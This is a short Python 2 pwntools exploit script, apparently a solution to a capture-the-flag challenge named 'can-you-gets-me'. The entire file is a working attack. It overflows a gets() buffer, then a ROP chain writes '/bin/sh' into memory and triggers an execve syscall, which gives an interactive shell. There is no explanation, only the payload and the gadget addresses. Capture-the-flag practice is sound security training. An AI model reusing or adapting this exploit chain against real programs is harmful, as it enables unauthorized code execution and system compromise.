#!/usr/bin/env python2
from pwn import *
from struct import pack, unpack
data = 0x080EA0C0 # some random writable place in the memory
data2 = 0x080EA0C4
pop_edx = 0x0806f19a # pop edx; ret
pop_ecx_ebx = 0x0806f1c1 # pop ecx; pop ebx; ret
pop_eax = 0x080b84d6 # pop eax; ret
pop_ebx = 0x0804f21c # pop ebx; ret
int_80 = 0x0806f7a0 # int 0x80; ret
write_to_memory = 0x0808a8c0 # mov [eax], ebx; mov eax, ecx; pop ebx; pop esi; pop edi; ret
p = process("/problems/can-you-gets-me_2_da0270478f868f229487e59ee4a8cf40/gets")
payload = "A"*28
payload += struct.pack("<I",pop_eax)
payload += struct.pack("<I",data)
payload += struct.pack("<I",pop_ebx)
payload += "/bin"
payload += struct.pack("<I",write_to_memory)
payload += struct.pack("<I",0)
payload += struct.pack("<I",0)
payload += struct.pack("<I",0)
payload += struct.pack("<I",pop_eax)
payload += struct.pack("<I",data2)
payload += struct.pack("<I",pop_ebx)
payload += "/sh\x00"
payload += struct.pack("<I",write_to_memory)
payload += struct.pack("<I",0)
payload += struct.pack("<I",0)
payload += struct.pack("<I",0)
payload += struct.pack("<I",pop_edx) # edx = 0
payload += struct.pack("<I",0)
payload += struct.pack("<I",pop_ecx_ebx) # ecx = 0, ebx=pointer to "/bin/sh"
payload += struct.pack("<I",0)
payload += struct.pack("<I",data)
payload += struct.pack("<I",pop_eax) # eax=0xb sys_execve
payload += struct.pack("<I",0xb)
payload += struct.pack("<I",int_80) # syscall
p.sendline(payload)
p.interactive()